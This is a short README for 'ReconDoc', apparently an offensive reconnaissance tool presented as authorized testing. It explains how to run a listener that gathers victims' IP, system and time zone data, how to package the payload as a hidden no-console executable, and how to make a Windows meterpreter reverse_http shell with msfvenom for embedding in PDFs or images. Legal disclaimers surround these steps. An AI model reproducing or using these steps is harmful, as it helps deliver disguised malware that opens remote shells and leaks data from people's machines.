# ReconDoc Tool

**⚠️ IMPORTANT: This tool is for authorized security testing and educational purposes only. Written permission is required before use in any environment.**

## Overview

ReconDoc is a security testing tool that demonstrates payload-based reconnaissance techniques. When triggered, it collects:
- Public IP address
- System information (OS, platform, architecture)
- Time zone information

## Setup

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Start the listener server:
```bash
python listener_server.py
```
The server will run on http://localhost:5000 and save collected data to the `logs` directory.

3. Test the payload:
```bash
python recon_payload.py
```

## Converting to Executable

To convert the payload to an executable:
```bash
pyinstaller --onefile --noconsole recon_payload.py
```

## Embedding in PDF/Image

For authorized testing purposes, you can use tools like `msfvenom` to embed the payload:

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=<your_ip> LPORT=<your_port> -f exe > payload.exe
```

## Legal Notice

This tool must only be used in environments where you have explicit, written permission to conduct penetration testing or red teaming. Unauthorized use could violate cybercrime laws (e.g., CFAA, GDPR, etc.). 